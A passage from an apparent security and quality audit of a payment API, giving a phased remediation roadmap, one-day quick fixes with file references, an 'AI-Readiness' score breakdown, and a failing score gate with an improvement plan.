| Disable Swagger UI registration when `NODE_ENV === 'production'` | DevOps | Verify `/documentation` returns 404 in production mode |

**Gate:** All Phase 0 items resolved before any production deployment.

### Phase 1 — Stabilize (1-2 weeks)

| Item | Owner | Verification |
|------|-------|-------------|
| Add CSRF protection via `@fastify/csrf-protection` or double-submit cookie | Dev | Add E2E test: cross-origin POST returns 403 |
| Move refresh tokens to httpOnly secure SameSite=strict cookies | Dev | Verify cookie is set in auth response, not in JSON body |
| Harden CSP: replace `unsafe-inline` with nonce-based script loading | Dev | Browser console shows no CSP violations on dashboard pages |
| Fix nonce lock fallback to use serializable transaction | Dev | Run `tests/services/nonce-lock-atomicity.test.ts` under simulated Redis failure |
| Consolidate to single PrismaClient instance | Dev | Verify only one connection pool in database `pg_stat_activity` |
| Add Redis `requirepass` to Docker and connection configs | DevOps | Redis CLI `AUTH` test passes |
| Fix refund worker: wrap FOR UPDATE in transaction | Dev | Run `tests/workers/refund-worker-locking.test.ts` |
| Fix payment link usage count with atomic update | Dev | Concurrent request test shows correct limit enforcement |
| Sanitize webhook worker error messages | Dev | Verify error response contains no internal hostnames |
| Fix refund amount precision at service boundary | Dev | Run `tests/services/refund-finalization.test.ts` with edge-case amounts |
| Add ownership check on payment status update | Dev | Verify merchant A cannot update merchant B's payment |

**Gate:** All scores >= 7/10, no Critical issues remaining.

### Phase 2 — Production-Ready (2-4 weeks)

| Item | Owner | Verification |
|------|-------|-------------|
| Add SAST scanning to CI pipeline (e.g., CodeQL, Semgrep) | DevOps | CI run shows SAST results in PR checks |
| Add secret scanning to CI (gitleaks or GitHub native) | DevOps | CI blocks PRs with detected secrets |
| Add frontend component tests for all dashboard pages | Dev | Jest coverage report shows > 60% frontend coverage |
| Fix rate limit keyGenerator to run after auth | Dev | Verify per-user rate limiting works for authenticated requests |
| Add UUID validation to all route param IDs | Dev | Invalid UUID returns 400, not 500 |
| Replace Math.random() in webhook event IDs with crypto.randomUUID() | Dev | Verify event IDs pass uniqueness and randomness checks |
| Add max refund amount validation | Dev | Refund exceeding payment amount returns 400 |
| Fix encryption key: remove unnecessary SHA-256 hash | Dev | Existing encryption/decryption tests still pass |
| Add checkout wallet address documentation and merchant consent | Dev | API docs note that wallet address is publicly visible |

**Gate:** All scores >= 8/10, compliance gaps addressed.

### Phase 3 — Excellence (4-8 weeks)

| Item | Owner | Verification |
|------|-------|-------------|
| Replace process.exit(1) in env-validator with thrown error | Dev | Unit test: validator throws on missing env vars |
| Add timing-safe comparison to metrics endpoint auth | Dev | Verify constant-time comparison in metrics auth |
| Standardize API response format across all endpoints | Dev | API contract tests verify consistent shape |
| Fix SSE test timing with event-driven assertions instead of setTimeout | Dev | Tests pass reliably across 10 consecutive runs |
| Add load testing baseline (k6 or Artillery) | DevOps | Performance baseline documented with p95 latencies |
| Add incident response runbook | DevOps | Runbook document in docs/ |
| Add monitoring and alerting pipeline | DevOps | Alert fires on health check failure |

**Gate:** All scores >= 9/10, audit-ready for external review.

---

## Section 14: Quick Wins (1-day fixes)

1. **HTML-escape email template interpolations** — Add `escapeHtml()` utility and apply to all 4 interpolation points in `email.service.ts:300-330`.
2. **Generic signup response** — Change `routes/auth.ts:50-51` to return identical response for duplicate and new emails.
3. **Guard dev routes** — Add `if (process.env.NODE_ENV === 'production') return;` at top of `routes/dev.ts`.
4. **Guard Swagger UI** — Add environment check before `app.register(swagger)` in `app.ts:225`.
5. **Fix spending limit query** — Replace read-check-write with atomic `UPDATE ... WHERE spent + amount <= limit` in `blockchain-transaction.service.ts:224-258`.
6. **Add Redis password** — Add `requirepass` to Docker Compose and update connection URL.
7. **Consolidate PrismaClient** — Remove duplicate instantiation in `utils/index.ts:44-46`, use the plugin instance.
8. **Sanitize webhook error** — Replace raw error message with generic string in `webhook-worker.ts:79`.
9. **Add ownership check** — Verify `payment.merchantId === currentUser.merchantId` before status updates in `payment.service.ts`.
10. **Replace Math.random** — Use `crypto.randomUUID()` for webhook event IDs.

---

## Section 15: AI-Readiness Score

| Sub-dimension | Score | Notes |
|---------------|-------|-------|
| Modularity | 1.8/2 | Clean service layer separation, plugin architecture, workers isolated. Minor coupling via dual Prisma instances. |
| API Design | 1.7/2 | RESTful routes, versioned API (v1), Zod validation. Minor: inconsistent response formats, missing UUID param validation. |
| Testability | 1.8/2 | 1,184 tests, behavioral testing, real infrastructure. Minor: no frontend component tests, timing-dependent SSE tests. |
| Observability | 1.5/2 | Structured logging, audit trail, log sanitization. Missing: metrics export, alerting, distributed tracing. |
| Documentation | 1.5/2 | PRD exists, API docs via Swagger, README comprehensive. Missing: deployment runbook, incident response, architecture decision records. |

**AI-Readiness Score: 8.3/10**

---

## Score Gate Check

**FAIL** — Multiple dimensions below 8/10:

| Dimension | Score | Gap |
|-----------|-------|-----|
| Security | 6.5/10 | -1.5 — Requires Phase 0 (XSS, enumeration) + Phase 1 (CSRF, tokens, CSP) |
| Performance | 7/10 | -1.0 — Requires Phase 1 (dual Prisma) + Phase 2 (rate limit, unbounded queries) |
| DevOps | 6.5/10 | -1.5 — Requires Phase 1 (Redis auth) + Phase 2 (SAST, secret scanning) |
| Security Readiness | 6/10 | -2.0 — Requires Phase 0 + Phase 1 security items |
| Enterprise Readiness | 6/10 | -2.0 — Requires Phase 0 + Phase 1 + compliance work |

**Improvement plan:** Execute Phase 0 (5 items, 48 hours) and Phase 1 (11 items, 1-2 weeks) to bring all dimensions to >= 8/10. Re-audit after Phase 1 completion.
